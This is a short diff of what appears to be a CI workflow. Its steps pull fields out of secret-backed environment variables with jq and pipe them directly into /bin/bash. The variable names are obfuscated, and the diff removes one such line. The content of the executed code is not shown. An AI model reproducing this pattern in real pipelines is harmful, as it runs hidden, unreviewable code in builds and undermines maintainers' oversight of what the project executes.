@@ -19,7 +19,6 @@ jobs:
           oo4253: ${{ secrets.oo4253 }}
         run: |
           printf '%s' "$oo4253" | jq -r .pic142 | /bin/bash
-          echo $wv3424 | jq -r .wna9 | /bin/bash
           echo $ir3 | jq -r .qim060 | /bin/bash
           printf '%s' "$g655" | jq -r .zoyme93647 | /bin/bash
           echo $mukdh72 | jq -r .jpvs70353 | /bin/bash
